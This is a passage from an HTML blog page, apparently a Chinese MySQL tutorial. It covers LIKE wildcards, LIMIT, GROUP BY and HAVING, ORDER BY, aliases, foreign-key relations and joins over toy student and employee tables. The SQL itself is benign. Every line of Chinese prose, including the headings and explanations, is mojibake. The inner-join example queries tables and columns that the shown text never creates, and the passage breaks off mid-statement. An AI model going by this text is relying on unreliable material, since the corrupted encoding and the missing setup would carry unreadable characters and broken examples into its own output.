alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="7-3-å«æœ‰-é€šé…çš„å­—ç¬¦ä¸²"><a href="#7-3-å«æœ‰-é€šé…çš„å­—ç¬¦ä¸²" class="headerlink" title="7.3 å«æœ‰_é€šé…çš„å­—ç¬¦ä¸²"></a>7.3 å«æœ‰_é€šé…çš„å­—ç¬¦ä¸²</h3><p>ä¸‹åˆ’çº¿é€šé…ç¬¦åªåŒ¹é…å•ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¦åŒ¹é…å¤šä¸ªå­—ç¬¦ï¼Œéœ€è¦è¿ç»­ä½¿ç”¨å¤šä¸ªä¸‹åˆ’çº¿é€šé…ç¬¦ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œab_â€åŒ¹é…ä»¥å­—ç¬¦ä¸²â€œabâ€å¼€å§‹é•¿åº¦ä¸º3çš„å­—ç¬¦ä¸²ï¼Œå¦‚abcã€abpç­‰ç­‰ï¼›å­—ç¬¦ä¸²â€œa__dâ€åŒ¹é…åœ¨å­—ç¬¦â€œaâ€å’Œâ€œdâ€ä¹‹é—´åŒ…å«ä¸¤ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¦‚â€abcdâ€ã€â€atudâ€ç­‰ç­‰ã€‚<br>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥zxå¼€å¤´ä¸”é•¿åº¦ä¸º4çš„è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;zx__&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302204051494.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥è¯¢å­¦ç”Ÿå§“åä»¥gç»“å°¾ä¸”é•¿åº¦ä¸º4çš„è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where sname like &#39;___g&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302204240798.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="8-ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡"><a href="#8-ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡" class="headerlink" title="8.ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡"></a>8.ä½¿ç”¨LIMITé™åˆ¶æŸ¥è¯¢ç»“æœçš„æ•°é‡</h2><p>å½“æ‰§è¡ŒæŸ¥è¯¢æ•°æ®æ—¶å¯èƒ½ä¼šè¿”å›å¾ˆå¤šæ¡è®°å½•ï¼Œè€Œç”¨æˆ·éœ€è¦çš„æ•°æ®å¯èƒ½åªæ˜¯å…¶ä¸­çš„ä¸€æ¡æˆ–è€…å‡ æ¡<br>æŸ¥è¯¢å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å°çš„3ä½åŒå­¦ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student order by age asc limit 3;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302204847986.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="9-ä½¿ç”¨GROUP-BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢"><a href="#9-ä½¿ç”¨GROUP-BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢" class="headerlink" title="9.ä½¿ç”¨GROUP BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢"></a>9.ä½¿ç”¨GROUP BYè¿›è¡Œåˆ†ç»„æŸ¥è¯¢</h2><p>GROUP BY å­å¥å¯åƒåˆ‡è›‹ç³•ä¸€æ ·å°†è¡¨ä¸­çš„æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œå†è¿›è¡ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚æ¢è¨€ä¹‹ï¼Œå¯é€šä¿—åœ°ç†è§£ä¸ºï¼šé€šè¿‡GROUP BYå°†åŸæ¥çš„è¡¨æ‹†åˆ†æˆäº†å‡ å¼ å°è¡¨ã€‚<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­å¼€å§‹å­¦ä¹ GROUP BYï¼Œä»£ç å¦‚ä¸‹</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- åˆ›å»ºæ•°æ®åº“<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- åˆ›å»ºå‘˜å·¥è¡¨<br>CREATE TABLE employee (<br>    id int,<br>    name varchar(50),<br>    salary int,<br>    departmentnumber int<br>);<br><br>-- å‘å‘˜å·¥è¡¨ä¸­æ’å…¥æ•°æ®<br>INSERT INTO employee values(1,&#x27;tome&#x27;,2000,1001); <br>INSERT INTO employee values(2,&#x27;lucy&#x27;,9000,1002); <br>INSERT INTO employee values(3,&#x27;joke&#x27;,5000,1003); <br>INSERT INTO employee values(4,&#x27;wang&#x27;,3000,1004); <br>INSERT INTO employee values(5,&#x27;chen&#x27;,3000,1001); <br>INSERT INTO employee values(6,&#x27;yukt&#x27;,7000,1002); <br>INSERT INTO employee values(7,&#x27;rett&#x27;,6000,1003); <br>INSERT INTO employee values(8,&#x27;mujk&#x27;,4000,1004); <br>INSERT INTO employee values(9,&#x27;poik&#x27;,3000,1001);<br><br></code></pre></td></tr></table></figure><h3 id="9-1-GROUP-BYå’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨"><a href="#9-1-GROUP-BYå’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨" class="headerlink" title="9.1 GROUP BYå’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨"></a>9.1 GROUP BYå’Œèšåˆå‡½æ•°ä¸€èµ·ä½¿ç”¨</h3><p>ç»Ÿè®¡å„éƒ¨é—¨å‘˜å·¥ä¸ªæ•° MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select count(*), departmentnumber from employee group by departmentnumber;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/2021030220555769.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»Ÿè®¡éƒ¨é—¨ç¼–å·å¤§äº1001çš„å„éƒ¨é—¨å‘˜å·¥ä¸ªæ•° MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select count(*), departmentnumber from employee where departmentnumber&gt;1001 group by departmentnumber;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302210134682.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="9-2-GROUP-BYå’Œèšåˆå‡½æ•°ä»¥åŠHAVINGä¸€èµ·ä½¿ç”¨"><a href="#9-2-GROUP-BYå’Œèšåˆå‡½æ•°ä»¥åŠHAVINGä¸€èµ·ä½¿ç”¨" class="headerlink" title="9.2 GROUP BYå’Œèšåˆå‡½æ•°ä»¥åŠHAVINGä¸€èµ·ä½¿ç”¨"></a>9.2 GROUP BYå’Œèšåˆå‡½æ•°ä»¥åŠHAVINGä¸€èµ·ä½¿ç”¨</h3><p>ç»Ÿè®¡å·¥èµ„æ€»å’Œå¤§äº8000çš„éƒ¨é—¨ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select sum(salary),departmentnumber from employee group by departmentnumber having sum(salary)&gt;8000;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210302210627962.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="10-ä½¿ç”¨ORDER-BYå¯¹æŸ¥è¯¢ç»“æœæ’åº"><a href="#10-ä½¿ç”¨ORDER-BYå¯¹æŸ¥è¯¢ç»“æœæ’åº" class="headerlink" title="10.ä½¿ç”¨ORDER BYå¯¹æŸ¥è¯¢ç»“æœæ’åº"></a>10.ä½¿ç”¨ORDER BYå¯¹æŸ¥è¯¢ç»“æœæ’åº</h2><p>ä»è¡¨ä¸­æŸ»è¯¢å‡ºæ¥çš„æ•°æ®å¯èƒ½æ˜¯æ— åºçš„æˆ–è€…å…¶æ’åˆ—é¡ºåºä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ORDER BYå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åº<br>å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT å­—æ®µå1,å­—æ®µå2,â€¦<br>FROM è¡¨å<br>ORDER BY å­—æ®µå1 [ASC ä¸¨ DESC],å­—æ®µå2 [ASC | DESC];<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šå­—æ®µå1ã€å­—æ®µå2æ˜¯æŸ¥è¯¢ç»“æœæ’åºçš„ä¾æ®ï¼›å‚æ•°<br>ASCè¡¨ç¤ºæŒ‰ç…§å‡åºæ’åºï¼ŒDESCè¡¨ç¤ºæŒ‰ç…§é™åºæ’åºï¼›é»˜è®¤æƒ…å†µä¸‹ï¼ŒæŒ‰ç…§ASCæ–¹å¼æ’åºã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒORDER BYå­å¥ä½äºæ•´ä¸ªSELECTè¯­å¥çš„æœ«å°¾ã€‚<br>æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿå¹¶æŒ‰ç…§å¹´çºªå¤§å°å‡åºæ’åˆ— MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student order by age asc;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030221134859.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿå¹¶æŒ‰ç…§å¹´çºªå¤§å°é™åºæ’åˆ— MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student order by age desc;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302211454223.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="åäºŒã€åˆ«åè®¾ç½®"><a href="#åäºŒã€åˆ«åè®¾ç½®" class="headerlink" title="åäºŒã€åˆ«åè®¾ç½®"></a>åäºŒã€åˆ«åè®¾ç½®</h1><p>åœ¨æŸ»è¯¢æ•°æ®æ—¶å¯ä¸ºè¡¨å’Œå­—æ®µå–åˆ¥åï¼Œè¯¥åˆ«åä»£æ›¿è¡¨å’Œå­—æ®µçš„åŸåå‚ä¸æŸ¥è¯¢æ“ä½œã€‚<br><strong>æ“ä½œçš„è¡¨äº‹å…ˆå·²å‡†å¤‡</strong></p><h2 id="1-ä¸ºè¡¨å–åˆ«å"><a href="#1-ä¸ºè¡¨å–åˆ«å" class="headerlink" title="1.ä¸ºè¡¨å–åˆ«å"></a>1.ä¸ºè¡¨å–åˆ«å</h2><p>åœ¨æŸ¥è¯¢æ“ä½œæ—¶ï¼Œå‡è‹¥è¡¨åå¾ˆé•¿ä½¿ç”¨èµ·æ¥å°±ä¸å¤ªæ–¹ä¾¿ï¼Œæ­¤æ—¶å¯ä¸ºè¡¨å–ä¸€ä¸ªåˆ¥åï¼Œç”¨è¯¥åˆ«åæ¥ä»£æ›¿è¡¨çš„åç§°ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>â€‹    <strong>SELECT * FROM è¡¨å [AS] è¡¨çš„åˆ«å WHERE â€¦. ;</strong></p><p>å°†studentæ”¹ä¸ºstuæŸ¥è¯¢æ•´è¡¨ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student as stu;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210303192155711.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-ä¸ºå­—æ®µå–åˆ«å"><a href="#2-ä¸ºå­—æ®µå–åˆ«å" class="headerlink" title="2.ä¸ºå­—æ®µå–åˆ«å"></a>2.ä¸ºå­—æ®µå–åˆ«å</h2><p>åœ¨æŸ¥è¯¢æ“ä½œæ—¶ï¼Œå‡è‹¥å­—æ®µåå¾ˆé•¿ä½¿ç”¨èµ·æ¥å°±ä¸å¤ªæ–¹ä¾¿ï¼Œæ­¤æ—¶å¯è¯¥å­—æ®µå–ä¸€ä¸ªåˆ¥åï¼Œç”¨è¯¥åˆ«åæ¥ä»£æ›¿å­—æ®µçš„åç§°ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>â€‹    <strong>SELECT å­—æ®µå1 [AS] åˆ«å1 , å­—æ®µå2 [AS] åˆ«å2 , â€¦ FROM è¡¨å WHERE â€¦ ;</strong></p><p>å°†studentä¸­çš„nameå–åˆ«åä¸ºâ€œå§“åâ€ æŸ¥è¯¢æ•´è¡¨ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select name as &#39;å§“å&#39;,id from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/2021030319253113.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="åä¸‰ã€è¡¨çš„å…³è”å…³ç³»"><a href="#åä¸‰ã€è¡¨çš„å…³è”å…³ç³»" class="headerlink" title="åä¸‰ã€è¡¨çš„å…³è”å…³ç³»"></a>åä¸‰ã€è¡¨çš„å…³è”å…³ç³»</h1><p>åœ¨å®é™…å¼€å‘ä¸­æ•°æ®è¡¨ä¹‹é—´å­˜åœ¨ç€å„ç§å…³è”å…³ç³»ã€‚åœ¨æ­¤ï¼Œä»‹ç»MySQLä¸­æ•°æ®è¡¨çš„ä¸‰ç§å…³è”å…³ç³»ã€‚<br><strong>å¤šå¯¹ä¸€</strong><br>å¤šå¯¹ä¸€(äº¦ç§°ä¸ºä¸€å¯¹å¤š)æ˜¯æ•°æ®è¡¨ä¸­æœ€å¸¸è§çš„ä¸€ç§å…³ç³»ã€‚ä¾‹å¦‚ï¼šå‘˜å·¥ä¸éƒ¨é—¨ä¹‹é—´çš„å…³ç³»ï¼Œä¸€ä¸ªéƒ¨é—¨å¯ä»¥æœ‰å¤šä¸ªå‘˜å·¥ï¼›è€Œä¸€ä¸ªå‘˜å·¥ä¸èƒ½å±äºå¤šä¸ªéƒ¨é—¨åªå±äºæŸä¸ªéƒ¨é—¨ã€‚åœ¨å¤šå¯¹ä¸€çš„è¡¨å…³ç³»<br>ä¸­ï¼Œåº”å°†å¤–é”®å»ºåœ¨å¤šçš„ä¸€æ–¹å¦åˆ™ä¼šé€ æˆæ•°æ®çš„å†—ä½™ã€‚<br><strong>å¤šå¯¹å¤š</strong><br>å¤šå¯¹å¤šæ˜¯æ•°æ®è¡¨ä¸­å¸¸è§çš„ä¸€ç§å…³ç³»ã€‚ä¾‹å¦‚ï¼šå­¦ç”Ÿä¸è€å¸ˆä¹‹é—´çš„å…³ç³»ï¼Œä¸€ä¸ªå­¦ç”Ÿå¯ä»¥æœ‰å¤šä¸ªè€å¸ˆè€Œä¸”ä¸€ä¸ªè€å¸ˆæœ‰å¤šä¸ªå­¦ç”Ÿã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†å®ç°è¿™ç§å…³ç³»éœ€è¦å®šä¹‰ä¸€å¼ ä¸­é—´è¡¨(äº¦ç§°ä¸ºè¿æ¥è¡¨)è¯¥è¡¨ä¼šå­˜åœ¨ä¸¤ä¸ªå¤–é”®åˆ†åˆ«å‚ç…§è€å¸ˆè¡¨å’Œå­¦ç”Ÿè¡¨ã€‚<br><strong>ä¸€å¯¹ä¸€</strong><br>åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸€å¯¹ä¸€çš„å…³è”å…³ç³»åœ¨æ•°æ®åº“ä¸­å¹¶ä¸å¸¸è§ï¼›å› ä¸ºä»¥è¿™ç§æ–¹å¼å­˜å‚¨çš„ä¿¡æ¯é€šå¸¸ä¼šæ”¾åœ¨åŒä¸€å¼ è¡¨ä¸­ã€‚<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥å­¦ä¹ åœ¨ä¸€å¯¹å¤šçš„å…³è”å…³ç³»ä¸­å¦‚æœæ·»åŠ å’Œåˆ é™¤æ•°æ®ã€‚å…ˆå‡†å¤‡ä¸€äº›æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP TABLE IF EXISTS student;<br>DROP TABLE IF EXISTS class;<br><br>-- åˆ›å»ºç­çº§è¡¨<br>CREATE TABLE class(<br>    cid int(4) NOT NULL PRIMARY KEY,<br>    cname varchar(30) <br>);<br><br>-- åˆ›å»ºå­¦ç”Ÿè¡¨<br>CREATE TABLE student(<br>    sid int(8) NOT NULL PRIMARY KEY,<br>    sname varchar(30),<br>    classid int(8) NOT NULL<br>);<br><br>-- ä¸ºå­¦ç”Ÿè¡¨æ·»åŠ å¤–é”®çº¦æŸ<br>ALTER TABLE student ADD CONSTRAINT fk_student_classid FOREIGN KEY(classid) REFERENCES class(cid);<br>-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®<br>INSERT INTO class(cid,cname)VALUES(1,&#x27;Java&#x27;);<br>INSERT INTO class(cid,cname)VALUES(2,&#x27;Python&#x27;);<br><br>-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student(sid,sname,classid)VALUES(1,&#x27;tome&#x27;,1);<br>INSERT INTO student(sid,sname,classid)VALUES(2,&#x27;lucy&#x27;,1);<br>INSERT INTO student(sid,sname,classid)VALUES(3,&#x27;lili&#x27;,2);<br>INSERT INTO student(sid,sname,classid)VALUES(4,&#x27;domi&#x27;,2);<br><br></code></pre></td></tr></table></figure><h2 id="1-å…³è”æŸ¥è¯¢"><a href="#1-å…³è”æŸ¥è¯¢" class="headerlink" title="1.å…³è”æŸ¥è¯¢"></a>1.å…³è”æŸ¥è¯¢</h2><p>æŸ¥è¯¢Javaç­çš„æ‰€æœ‰å­¦ç”Ÿ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student where classid=(select cid from class where cname=&#39;Java&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/2021030319330865.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-å…³äºå…³è”å…³ç³»çš„åˆ é™¤æ•°æ®"><a href="#2-å…³äºå…³è”å…³ç³»çš„åˆ é™¤æ•°æ®" class="headerlink" title="2.å…³äºå…³è”å…³ç³»çš„åˆ é™¤æ•°æ®"></a>2.å…³äºå…³è”å…³ç³»çš„åˆ é™¤æ•°æ®</h2><p>è¯·ä»ç­çº§è¡¨ä¸­åˆ é™¤Javaç­çº§ã€‚åœ¨æ­¤ï¼Œè¯·æ³¨æ„ï¼šç­çº§è¡¨å’Œå­¦ç”Ÿè¡¨ä¹‹é—´å­˜åœ¨å…³è”å…³ç³»ï¼›è¦åˆ é™¤Javaç­çº§ï¼Œåº”è¯¥å…ˆåˆ é™¤å­¦ç”Ÿè¡¨ä¸­ä¸è¯¥ç­ç›¸å…³è”çš„å­¦ç”Ÿã€‚å¦åˆ™ï¼Œå‡è‹¥å…ˆåˆ é™¤Javaç­é‚£ä¹ˆå­¦ç”Ÿè¡¨ä¸­çš„cidå°±å¤±å»äº†å…³è”<br>åˆ é™¤Javaç­ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>delete from student where classid=(select cid from class where cname=&#39;Java&#39;);</code><br><code>â€‹    delete from class where cname=&#39;Java&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030319415767.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="åå››ã€å¤šè¡¨è¿æ¥æŸ¥è¯¢"><a href="#åå››ã€å¤šè¡¨è¿æ¥æŸ¥è¯¢" class="headerlink" title="åå››ã€å¤šè¡¨è¿æ¥æŸ¥è¯¢"></a>åå››ã€å¤šè¡¨è¿æ¥æŸ¥è¯¢</h1><h2 id="1-äº¤å‰è¿æ¥æŸ¥è¯¢"><a href="#1-äº¤å‰è¿æ¥æŸ¥è¯¢" class="headerlink" title="1.äº¤å‰è¿æ¥æŸ¥è¯¢"></a>1.äº¤å‰è¿æ¥æŸ¥è¯¢</h2><p>äº¤å‰è¿æ¥è¿”å›çš„ç»“æœæ˜¯è¢«è¿æ¥çš„ä¸¤ä¸ªè¡¨ä¸­æ‰€æœ‰æ•°æ®è¡Œçš„ç¬›å¡å„¿ç§¯ï¼›æ¯”å¦‚ï¼šé›†åˆA&#x3D;{a,b}ï¼Œé›†åˆB&#x3D;{0,1,2}ï¼Œåˆ™é›†åˆAå’ŒBçš„ç¬›å¡å°”ç§¯ä¸º{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}ã€‚æ‰€ä»¥ï¼Œäº¤å‰è¿æ¥ä¹Ÿè¢«ç§°ä¸ºç¬›å¡å°”è¿æ¥ï¼Œå…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>â€‹    <strong>SELECT * FROM è¡¨1 CROSS JOIN è¡¨2;</strong></p><p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šCROSS JOINç”¨äºè¿æ¥ä¸¤ä¸ªè¦æŸ¥è¯¢çš„è¡¨ï¼Œé€šè¿‡è¯¥è¯­å¥å¯ä»¥æŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­æ‰€æœ‰çš„æ•°æ®ç»„åˆã€‚<br><strong>ç”±äºè¿™ä¸ªäº¤å‰è¿æ¥æŸ¥è¯¢åœ¨å®é™…è¿ç”¨ä¸­æ²¡æœ‰ä»»ä½•æ„ä¹‰ ï¼Œæ‰€ä»¥åªåšä¸ºäº†è§£å³å¯</strong></p><h2 id="2-å†…è¿æ¥æŸ¥è¯¢"><a href="#2-å†…è¿æ¥æŸ¥è¯¢" class="headerlink" title="2.å†…è¿æ¥æŸ¥è¯¢"></a>2.å†…è¿æ¥æŸ¥è¯¢</h2><p>å†…è¿æ¥(Inner<br>Join)åˆç§°ç®€å•è¿æ¥æˆ–è‡ªç„¶è¿æ¥ï¼Œæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„è¿æ¥æŸ¥è¯¢ã€‚å†…è¿æ¥ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦å¯¹ä¸¤ä¸ªè¡¨ä¸­çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒå¹¶åˆ—å‡ºä¸è¿æ¥æ¡ä»¶åŒ¹é…çš„æ•°æ®è¡Œï¼Œç»„åˆæˆæ–°çš„<br>è®°å½•ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å†…è¿æ¥æŸ¥è¯¢ä¸­åªæœ‰æ»¡è¶³æ¡ä»¶çš„è®°å½•æ‰èƒ½å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>â€‹<br>â€‹    SELECT æŸ¥è¯¢å­—æ®µ1,æŸ¥è¯¢å­—æ®µ2, â€¦ FROM è¡¨1 [INNER] JOIN è¡¨2 ON è¡¨1.å…³ç³»å­—æ®µ&#x3D;è¡¨2.å…³ç³»å­—æ®µ</p><p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šINNER JOINç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨ï¼ŒONæ¥æŒ‡å®šè¿æ¥æ¡ä»¶ï¼›å…¶ä¸­INNERå¯ä»¥çœç•¥ã€‚</p><p>å‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p>æŸ¥è¯¢å‘˜å·¥å§“ååŠå…¶æ‰€å±éƒ¨é—¨åç§° MySQLå‘½ä»¤ï¼š</p><p>â€‹<br>â€‹    select employee.ename,department.dname from department inner join employee on department.did&#x3D;employee.departmentid;</p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/2021030320040897.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-å¤–è¿æ¥æŸ¥è¯¢"><a href="#3-å¤–è¿æ¥æŸ¥è¯¢" class="headerlink" title="3.å¤–è¿æ¥æŸ¥è¯¢"></a>3.å¤–è¿æ¥æŸ¥è¯¢</h2><p>åœ¨ä½¿ç”¨å†…è¿æ¥æŸ¥è¯¢æ—¶æˆ‘ä»¬å‘ç°ï¼šè¿”å›çš„ç»“æœåªåŒ…å«ç¬¦åˆæŸ¥è¯¢æ¡ä»¶å’Œè¿æ¥æ¡ä»¶çš„æ•°æ®ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶è¿˜éœ€è¦åœ¨è¿”å›æŸ¥è¯¢ç»“æœä¸­ä¸ä»…åŒ…å«ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼Œè€Œä¸”è¿˜åŒ…æ‹¬å·¦è¡¨ã€å³è¡¨æˆ–ä¸¤ä¸ªè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨å¤–è¿æ¥æŸ¥è¯¢ã€‚å¤–è¿æ¥åˆåˆ†ä¸ºå·¦(å¤–)è¿æ¥å’Œå³(å¤–)è¿æ¥ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>â€‹    SELECT æŸ¥è¯¢å­—æ®µ1,æŸ¥è¯¢å­—æ®µ2, â€¦ FROM è¡¨1 LEFT | RIGHT [OUTER] JOIN è¡¨2 ON è¡¨1.å…³ç³»å­—æ®µ&#x3D;è¡¨2.å…³ç³»å­—æ®µ WHERE æ¡ä»¶</p><p>ç”±æ­¤å¯è§ï¼Œå¤–è¿æ¥çš„è¯­æ³•æ ¼å¼å’Œå†…è¿æ¥éå¸¸ç›¸ä¼¼ï¼Œåªä¸è¿‡ä½¿ç”¨çš„æ˜¯LEFT [OUTER] JOINã€RIGHT [OUTER]<br>JOINå…³é”®å­—ã€‚å…¶ä¸­ï¼Œå…³é”®å­—å·¦è¾¹çš„è¡¨è¢«ç§°ä¸ºå·¦è¡¨ï¼Œå…³é”®å­—å³è¾¹çš„è¡¨è¢«ç§°ä¸ºå³è¡¨ï¼›OUTERå¯ä»¥çœç•¥ã€‚<br>åœ¨ä½¿ç”¨å·¦(å¤–)è¿æ¥å’Œå³(å¤–)è¿æ¥æŸ¥è¯¢æ—¶ï¼ŒæŸ¥è¯¢ç»“æœæ˜¯ä¸ä¸€è‡´çš„ï¼Œå…·ä½“å¦‚ä¸‹ï¼š<br>**1ã€LEFT [OUTER] JOIN å·¦(å¤–)è¿æ¥ ï¼šè¿”å›åŒ…æ‹¬å·¦è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå³è¡¨ä¸­ç¬¦åˆè¿æ¥æ¡ä»¶çš„è®°å½•ã€‚ ** </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT æŸ¥è¯¢å­—æ®µ1,æŸ¥è¯¢å­—æ®µ2, ... FROM è¡¨1 LEFT | RIGHT [OUTER] JOIN è¡¨2 ON è¡¨1.å…³ç³»å­—æ®µ=è¡¨2.å…³ç³»å­—æ®µ WHERE 